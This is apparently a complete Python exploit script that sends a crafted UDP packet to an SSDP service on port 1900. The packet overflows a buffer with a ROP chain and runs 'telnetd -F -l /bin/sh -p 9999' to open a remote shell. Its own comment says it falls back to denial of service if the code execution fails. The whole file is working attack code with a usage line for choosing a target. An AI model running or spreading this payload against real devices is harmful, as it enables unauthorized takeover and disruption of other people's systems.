import sys
import socket
import time

addr_r7 = \
b"\xcc\x04\x10\x40" # if this address readble, RCE; otherwise DOS;

addr_rop0 = \
b"\x24\x91\x01\x00"

addr_rop1 = \
b"\xcc\x04\x10\x40" \
b"\x41\x41\x41\x41\x41\x41\x41\x41" \
b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xe4\xce\x00\x00"

addr_rop2 = \
b"\x78\x78\x01\x00"

cmd = \
b"telnetd -F -l /bin/sh -p 9999;" \
b"\x00"

data = b"\x41"*0x604 + \
	addr_r7 + b"\x41"*0x28 + addr_rop0 + \
	b"\x61"*0x258 + addr_rop1 + cmd + \
	b"\x41"*0x3ed + addr_rop2


def send_ssdp(ip, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.connect((ip, port))
	sock.send(data)

def usage():
	print("python3 %s ip port(1900)" % sys.argv[0])

if __name__ == "__main__":
	if len(sys.argv) != 3:
		usage()
	else:
		send_ssdp(sys.argv[1], int(sys.argv[2]))